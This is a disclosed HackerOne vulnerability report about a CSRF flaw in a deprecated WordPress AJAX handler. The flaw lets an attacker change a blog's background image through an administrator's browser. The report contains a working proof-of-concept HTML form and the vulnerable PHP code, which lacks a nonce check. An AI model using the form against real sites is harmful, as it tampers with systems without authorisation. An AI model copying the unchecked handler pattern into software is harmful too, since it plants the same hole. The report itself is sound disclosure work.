# Arbitrary change of blog's background image via CSRF

## Report Details
- **Report ID**: 881855
- **URL**: https://hackerone.com/reports/881855
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-24T17:13:23.625Z
- **Disclosed**: 2020-12-14T10:19:54.363Z

## Reporter
- **Username**: erwan_lr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
## Description:

Despite being deprecated since v3.5.0, the `wp_set_background_image` method (defined in wp-admin/includes/class-custom-background.php), registered as an authenticated AJAX call (`wp_ajax_set-background-image`), is still active.

Given that the method is lacking CSRF checks, an attacker could change the background image of the blog to an arbitrary one from the media library via a CSRF attack on a logged in user with the `edit_theme_options` capability (by default administrators).

## Steps To Reproduce:

Save the code below in an HTML file, replace the `[WP]` by the correct domain, and change the `attachement_id` to an existing attachment id. The `size` parameter can also be changed to `thumbnail`, `medium`, `large` or `full`.

```html
<html>
  <body>
    <form action="https://[WP]/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="attachment_id" value="5" />
      <input type="hidden" name="action" value="set-background-image" />
      <input type="hidden" name="size" value="thumbnail" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Then log on to the blog as an administrator, open the file (with the same web browser used to login) and click the `Submit request` button. Then go the homepage of the blog and notice that the background image has been changed.

## Recommendations

Given that the method has been deprecated and replaced with the `ajax_background_add` one which has the correct checks (both CSRF and authorisation), it would be recommended to remove the `wp_set_background_image` function all together, or at least not register it in the `wp_ajax_` hook.

## Affected Code

In wp-admin/includes/class-custom-background.php

```php
// Unused since 3.5.0.
add_action( 'wp_ajax_set-background-image', array( $this, 'wp_set_background_image' ) );

/**
 * @since 3.4.0
 * @deprecated 3.5.0
 */
public function wp_set_background_image() {
	if ( ! current_user_can( 'edit_theme_options' ) || ! isset( $_POST['attachment_id'] ) ) {
		exit;
	}

	$attachment_id = absint( $_POST['attachment_id'] );

	$sizes = array_keys(
		/** This filter is documented in wp-admin/includes/media.php */
		apply_filters(
			'image_size_names_choose',
			array(
				'thumbnail' => __( 'Thumbnail' ),
				'medium'    => __( 'Medium' ),
				'large'     => __( 'Large' ),
				'full'      => __( 'Full Size' ),
			)
		)
	);

	$size = 'thumbnail';
	if ( in_array( $_POST['size'], $sizes ) ) {
		$size = esc_attr( $_POST['size'] );
	}

	update_post_meta( $attachment_id, '_wp_attachment_is_custom_background', get_option( 'stylesheet' ) );

	$url       = wp_get_attachment_image_src( $attachment_id, $size );
	$thumbnail = wp_get_attachment_image_src( $attachment_id, 'thumbnail' );
	set_theme_mod( 'background_image', esc_url_raw( $url[0] ) );
	set_theme_mod( 'background_image_thumb', esc_url_raw( $thumbnail[0] ) );
	exit;
}
```

## Impact

An attacker could make a logged in administrator change the background image of the blog to one of the image available in the media library.

Depending on the images available, the blog may become unreadable as the image repeats itself, potentially masking the text.

## Attachments
- Screenshot_2020-05-24_at_18.21.57.png
